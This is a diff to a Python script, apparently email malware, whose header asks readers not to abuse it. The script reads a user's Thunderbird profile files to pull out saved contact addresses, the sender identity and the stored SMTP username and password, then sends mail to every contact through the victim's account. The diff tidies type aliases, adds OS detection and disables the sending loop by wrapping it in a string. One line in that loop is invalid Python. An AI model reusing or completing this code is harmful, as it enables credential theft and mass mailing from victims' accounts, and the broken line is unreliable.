@@ -13,6 +13,7 @@ do not abuse it to cause any harm!
 # --------------------------------------------------------------------------
 
 import os
+import platform
 import shutil
 import sys
 import re
@@ -31,15 +32,25 @@ import json
 # -------------------- global variables and constants ----------------------
 # --------------------------------------------------------------------------
 
+INSTALLED_OS: str = platform.system()
+LINUX: str = "Linux"
+WINDOWS: str = "Windows"
+
 SSL: str = "SSL"
 TLS: str = "TLS"
 STARTTLS: str = "STARTTLS"
+
+# type variables:
+ArbitraryType = typing.TypeVar("ArbitraryType")
+ArbKeyArbValDict = typing.Dict[ArbitraryType, ArbitraryType]
+IntKeyArbValDict = typing.Dict[int, ArbitraryType]
+IntKeyStrValDict = typing.Dict[int, str]
 
 # --------------------------------------------------------------------------
 # ----------------- 3rd class send email helper functions ------------------
 # --------------------------------------------------------------------------
 
-def flat_search_dict(searched_key: filewriter.ArbitraryType, input_dict: filewriter.ArbKeyArbValDict) -> filewriter.ArbitraryType:
+def flat_search_dict(searched_key: ArbitraryType, input_dict: ArbKeyArbValDict) -> ArbitraryType:
     """
     Searches the top level of a dictionary for the passed `searched_key`
     and returns its corresponding value.
@@ -146,7 +157,7 @@ def search_file_in_default_dir(filename: str) -> str:
     return None
 
 
-def gen_dict_extract_special(searched_key_1: filewriter.ArbitraryType, searched_value_1: filewriter.ArbitraryType, searched_key_2: filewriter.ArbitraryType, searched_key_3: filewriter.ArbitraryType, searched_elem: filewriter.ArbKeyArbValDict) -> filewriter.ArbitraryType:
+def gen_dict_extract_special(searched_key_1: ArbitraryType, searched_value_1: ArbitraryType, searched_key_2: ArbitraryType, searched_key_3: ArbitraryType, searched_elem: ArbKeyArbValDict) -> ArbitraryType:
     """
     Adapted version of `gen_dict_extract()`: If `searched_key_1` was found 
     and has the passed `searched_value_1` or ends with the passed 
@@ -393,7 +404,7 @@ def read_sender_name_and_email_thunderbird() -> typing.Tuple[str, str]:
     prefs_js_filename = search_file_in_default_dir("prefs.js")
     
     if prefs_js_filename: # if prefs_js_filename is not `None`
-        lines = filewriter.read_text_file_to_dict(prefs_js_filename)
+        lines = read_text_file_to_dict(prefs_js_filename)
         user_name_regex = r", \"(.+?)\"\);"
         # Regex matching all possible email addresses:
         # email_regex = TODO
@@ -531,6 +542,7 @@ def send_email() -> None:
     else:
         # Detect all Thunderbird profile directories:
         profile_dirs = find_thunderbird_default_profile_dir()
+        """
         for profile_dir in profile_dirs:
             #print(f"profile_dir = {profile_dir}")
             to_email_addresses: typing.List[str] = read_email_addresses_thunderbird()
@@ -540,6 +552,7 @@ def send_email() -> None:
             sender_username: str, sender_password: str = read_sender_username_and_password_thunderbird(host_name)
             smtp_server_url, authentication_method = determine_smtp_server(sender_email)
             send_mail_mime(smtp_server_url, authentication_method, sender_password, to_email_addresses)
+        """
 
 
 if __name__ == "__main__":
